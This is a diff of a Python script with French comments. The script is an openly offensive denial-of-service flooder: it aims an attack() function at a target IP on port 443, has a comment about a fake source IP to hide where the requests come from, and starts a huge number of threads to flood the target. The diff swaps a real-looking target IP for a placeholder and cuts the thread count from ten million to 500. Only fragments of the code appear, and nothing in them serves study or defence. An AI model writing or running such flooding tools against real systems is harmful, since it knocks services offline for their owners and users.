@@ -2,7 +2,7 @@ import socket
 import threading
 
 # Adresse IP ou nom de domaine de la cible
-target = '162.210.96.123'  # IP cible ou nom de domaine
+target = 'x.x.x.x'  # IP cible ou nom de domaine
 # Port utilisé pour la connexion (443 pour HTTPS, 80 pour HTTP)
 port = 443  # Port pour HTTPS, ou 80 pour HTTP
 # Adresse IP factice pour masquer l'origine des requêtes
@@ -35,7 +35,7 @@ def attack():
         print(already_connected)
 
 # Création et démarrage de 10 millions de threads, chacun exécutant la fonction d'attaque
-for i in range(10000000):
+for i in range(500):
     # Création d'un thread pour exécuter la fonction d'attaque
     thread = threading.Thread(target=attack)
     # Démarrage du thread
